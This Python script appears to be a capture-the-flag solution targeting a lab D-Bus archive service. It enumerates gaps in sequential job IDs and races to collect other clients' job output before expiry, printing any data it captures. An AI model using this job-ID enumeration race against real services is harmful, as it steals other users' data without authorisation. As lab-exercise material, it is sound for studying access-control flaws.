#!/usr/bin/env python3
import dbus
import re
import time
import sys
import os

bus = dbus.bus.BusConnection("unix:path=/run/archive-bus/bus")
obj = bus.get_object("org.ctf.Archive1", "/org/ctf/Archive1")
mgr = dbus.Interface(obj, "org.ctf.Archive1.Manager")

def job_iface(path):
    jo = bus.get_object("org.ctf.Archive1", path)
    return dbus.Interface(jo, "org.ctf.Archive1.Job")

def extract_id(path):
    m = re.search(r"j(\d+)$", str(path))
    return int(m.group(1)) if m else None

def try_collect_fast(path, budget=0.4):
    """Poll status briefly then collect, tolerant of fast expiry."""
    t0 = time.time()
    ji = job_iface(path)
    while time.time() - t0 < budget:
        try:
            s = ji.GetStatus()
        except Exception as e:
            return None, f"status-gone: {e}"
        if s[0] not in ("Queued", "Running"):
            break
        time.sleep(0.003)
    try:
        fd = ji.Collect()
        n = fd.take()
        data = b""
        while True:
            chunk = os.read(n, 65536)
            if not chunk:
                break
            data += chunk
        os.close(n)
        return data, None
    except Exception as e:
        return None, str(e)

last_id = None
caught = []
deadline = time.time() + 40
iteration = 0

print("starting race loop", flush=True)
while time.time() < deadline and not caught:
    iteration += 1
    try:
        path = mgr.Submit("welcome")
    except Exception as e:
        print(f"[submit err] {e}", flush=True)
        time.sleep(0.05)
        continue
    cur_id = extract_id(path)
    if last_id is not None and cur_id is not None and cur_id > last_id + 1:
        for gid in range(last_id + 1, cur_id):
            gpath = f"/org/ctf/Archive1/jobs/j{gid}"
            data, err = try_collect_fast(gpath, budget=0.3)
            if data is not None:
                print(f"[GAP id={gid}] COLLECTED {len(data)} bytes:", flush=True)
                print(data.decode(errors="replace"), flush=True)
                caught.append((gid, data))
            else:
                print(f"[GAP id={gid}] failed: {err}", flush=True)
    last_id = cur_id
    # self-collect our own job to free quota
    data, err = try_collect_fast(path, budget=0.3)
    if data is None:
        print(f"[self-collect {cur_id} failed] {err}", flush=True)
    time.sleep(0.02)

print(f"done iterations={iteration} caught={len(caught)}", flush=True)
